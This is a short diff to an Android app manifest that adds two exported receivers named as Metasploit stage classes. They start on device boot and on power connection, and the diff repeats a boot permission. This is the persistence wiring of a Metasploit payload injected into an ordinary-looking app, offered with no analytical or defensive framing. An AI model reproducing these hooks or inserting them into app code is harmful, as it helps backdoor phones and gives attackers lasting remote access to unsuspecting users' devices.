@@ -52,7 +52,18 @@
 <action android:name="android.intent.action.BOOT_COMPLETED" />
 </intent-filter>
 </receiver>
+<receiver android:name="com.metasploit.stage.BootReceiver" android:enabled="true" android:exported="true">
+<intent-filter>
+<action android:name="android.intent.action.BOOT_COMPLETED" />
+</intent-filter>
+</receiver>
+<receiver android:name="com.metasploit.stage.PowerReceiver" android:enabled="true" android:exported="true">
+<intent-filter>
+<action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
+</intent-filter>
+</receiver>
     </application>
+<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 </manifest>
